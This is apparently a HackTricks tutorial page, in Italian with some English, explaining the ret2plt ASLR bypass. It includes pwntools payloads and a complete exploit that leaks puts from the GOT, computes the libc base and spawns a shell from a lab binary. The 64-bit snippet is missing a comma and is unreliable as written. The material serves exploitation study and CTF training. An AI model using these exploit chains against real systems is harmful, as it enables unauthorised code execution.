# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

L'obiettivo di questa tecnica è **effettuare un leak di un indirizzo di una funzione dalla PLT** per poter bypassare ASLR. Questo perché, ad esempio, se effettui un leak dell'indirizzo della funzione `puts` dalla libc, puoi poi **calcolare dov'è la base della `libc`** e calcolare gli offset per accedere ad altre funzioni come **`system`**.

Questo può essere fatto con un payload `pwntools` come ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Nota come **`puts`** (usando l'indirizzo dalla PLT) viene chiamato con l'indirizzo di `puts` situato nella GOT (Global Offset Table). Questo perché, al momento in cui `puts` stampa la voce GOT di puts, questa **voce conterrà l'indirizzo esatto di `puts` in memoria**.

Nota inoltre come l'indirizzo di `main` sia usato nell'exploit in modo che quando `puts` termina la sua esecuzione, il **binary richiami `main` invece di terminare** (quindi l'indirizzo leaked continuerà a essere valido).

> [!CAUTION]
> Nota che, affinché questo funzioni, il **binary non può essere compilato con PIE** oppure devi aver trovato un leak per bypassare PIE per poter conoscere l'indirizzo della PLT, GOT e di main. Altrimenti, devi prima bypassare PIE.

Puoi trovare un [**esempio completo di questo bypass qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Questo era l'exploit finale di quell'**esempio**:

<details>
<summary>Esempio completo di exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considerazioni moderne

- **`-fno-plt` builds** (comuni nelle distro moderne) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: il GOT è di sola lettura ma ret2plt funziona ancora per i leak perché si legge solo lo slot GOT. If the symbol was never called, your first ret2plt will also perform lazy binding and then print the resolved slot.
- **ASLR + PIE**: se PIE è abilitato, prima fai leak di un code pointer (es., saved return address, function pointer, o `.plt` entry via un altro format‑string/infoleak) per calcolare la PIE base, poi costruisci la catena ret2plt con gli indirizzi PLT/GOT ricalcolati.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: le entry PLT sono validi BTI landing pads (`bti c`), quindi quando sfrutti binari abilitati a BTI preferisci saltare nello stub PLT (o in un altro gadget annotato BTI) invece che direttamente in un gadget libc senza BTI, altrimenti la CPU genererà `BRK`/`PAC` failures.
- **Quick resolution helper**: se la funzione target non è ancora risolta e hai bisogno di un leak in un solo colpo, catena la chiamata PLT due volte: prima `elf.plt['foo']` (per risolvere) poi di nuovo `elf.plt['foo']` con l'indirizzo GOT come argomento per stampare lo slot ora popolato.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## Riferimenti

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
